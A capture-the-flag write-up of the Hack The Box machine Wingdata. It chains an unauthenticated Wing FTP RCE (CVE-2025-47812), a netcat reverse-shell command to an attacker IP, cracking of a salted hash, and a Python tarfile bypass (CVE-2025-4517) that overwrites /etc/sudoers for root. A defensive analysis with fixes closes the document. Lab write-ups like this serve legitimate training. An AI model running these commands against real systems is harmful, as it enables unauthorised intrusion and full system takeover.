## Summary

Wingdata is an Easy Linux machine running **Wing FTP Server v7.4.3**, vulnerable
to an unauthenticated RCE (CVE-2025-47812) that yields a shell as `wingftp`.
Local user XML files expose a salted SHA-256 hash that is cracked (custom salt
`WingFTP`) for SSH access as `wacky`. A sudo-allowed backup script using Python's
`tarfile` is exploited via a tar extraction bypass (CVE-2025-4517) to overwrite
`/etc/sudoers` and escalate to **root**.

## Machine Information

| Name | Difficulty | OS | Platform |
| --- | --- | --- | --- |
| Wingdata | Easy | Linux | Hack The Box |

## Attack Path

1. Initial enumeration with Nmap.
2. Identify Wing FTP Server v7.4.3.
3. Exploit unauthenticated RCE (CVE-2025-47812).
4. Initial shell as `wingftp`.
5. Local enumeration and credential collection.
6. Crack a salted hash (custom salt).
7. SSH access as `wacky`.
8. sudo enumeration.
9. Exploit the Python `tarfile` bypass (CVE-2025-4517).
10. Obtain root.

## Reconnaissance

Initial enumeration was performed with **Nmap**.

```bash
nmap -sC -sV -A 10.129.29.71
```

Two ports were open: **22 (SSH)** for later access and **80 (HTTP)** as the main
attack vector.

## Web Enumeration

The web application was a corporate site for "Wing Data Solutions". Browsing
revealed the **Wing FTP Server Web Client**, which disclosed the version:

```
Wing FTP Server v7.4.3
```

The exact version made it possible to search for version-specific
vulnerabilities.

## Exploitation — Wing FTP RCE (CVE-2025-47812)

Wing FTP Server v7.4.3 is vulnerable to **unauthenticated RCE** via manipulation
of the `username` parameter on the login endpoint.

A public Python exploit was used, first validating execution with `whoami`:

```bash
python3 exploit.py -u http://ftp.wingdata.htb -v
```

Then to obtain a reverse shell:

```bash
python3 exploit.py -u http://ftp.wingdata.htb -v -c "nc -c sh 10.10.14.233 1337"
```

## Initial Access (User)

A listener was prepared on the attacker machine, and the exploit returned a
shell as the `wingftp` service user.

```bash
nc -nvlp 1337
```

## Privilege Escalation

### Credential collection

Local enumeration found user XML files containing password hashes:

```
/opt/wftpserver/Data/1/users/
```

`wacky.xml` exposed a hash:

```
32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca
```

### Cracking the salted hash

Plain SHA-256 failed; the system used the fixed salt `WingFTP`. Hashcat cracked
it with the salted SHA-256 mode:

```bash
hashcat -m 1410 hash.txt /usr/share/wordlists/rockyou.txt
```

```
!#7Blushing^*Bride5
```

These credentials were reused for a stable SSH session as `wacky`:

```bash
ssh wacky@ftp.wingdata.htb
```

The user flag lives at `/home/wacky/user.txt`.

### tarfile bypass (CVE-2025-4517)

`sudo -l` showed `wacky` could run a backup script as root:

```
/usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *
```

The script extracted archives with `tar.extractall(path=staging_dir, filter="data")`.
That filter is not fully safe and is bypassable via CVE-2025-4517 using a
symlink/hardlink combination, allowing arbitrary writes as root.

A PoC was used to craft a malicious `.tar` that escapes the directory and
overwrites `/etc/sudoers`, granting `wacky` full sudo:

```bash
python3 /tmp/CVE-2025-4517-POC.py
```

```
wacky ALL=(ALL) NOPASSWD: ALL
```

A root shell was then trivial:

```bash
sudo /bin/bash
```

The root flag lives at `/root/root.txt`.

## Vulnerability Analysis

**Wing FTP RCE (CVE-2025-47812)** — unauthenticated remote code execution via the
login `username` parameter gave the initial foothold as the `wingftp` service
user. Fix: upgrade Wing FTP Server and sanitize authentication parameters.

**Exposed credentials** — password hashes were readable in user XML files,
enabling offline recovery and SSH access. Fix: restrict permissions on
application data directories and store secrets outside world-readable locations.

**Python `tarfile` bypass (CVE-2025-4517)** — the `filter="data"` protection was
bypassed with symlink/hardlink tricks, allowing arbitrary file writes as root.
Fix: patch Python, validate archive entries against the destination directory,
and reject symlinks/absolute paths during extraction.

**Insecure sudo script** — a root-run script extracted attacker-controlled
archives without adequate validation, enabling the tarfile bypass. Fix: avoid
running attacker-influenced input as root and review sudo-allowed scripts
carefully.

## Tools Used

- Nmap
- Netcat
- Python3
- Hashcat
- SSH

## Key Takeaways

- Version fingerprinting can immediately lead to a known exploit.
- Hashes may use a custom/fixed salt; identify it before cracking.
- An unstable reverse shell should be upgraded to SSH when possible.
- Bugs in standard libraries (like `tarfile`) can directly enable privesc.
- Scripts allowed via sudo must be reviewed carefully.
